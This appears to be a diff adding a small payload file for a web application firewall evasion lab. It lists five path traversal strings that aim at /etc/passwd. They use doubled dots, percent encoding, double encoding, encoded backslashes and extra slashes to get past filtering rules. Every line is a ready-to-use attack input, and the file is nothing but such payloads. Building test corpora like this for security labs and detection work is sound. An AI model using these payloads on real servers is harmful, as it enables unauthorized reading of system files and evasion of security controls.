@@ -1,0 +1,6 @@
+# Lab + WAF evasion tier lab: alternate slash/overlong-slash style segments (noise for rules)
+....//....//....//etc/passwd
+.%2e.%2e%2f.%2e.%2e%2f.%2e.%2e%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5cetc%5cpasswd
+..%252f..%252fetc%252fpasswd
+..///..///etc/passwd
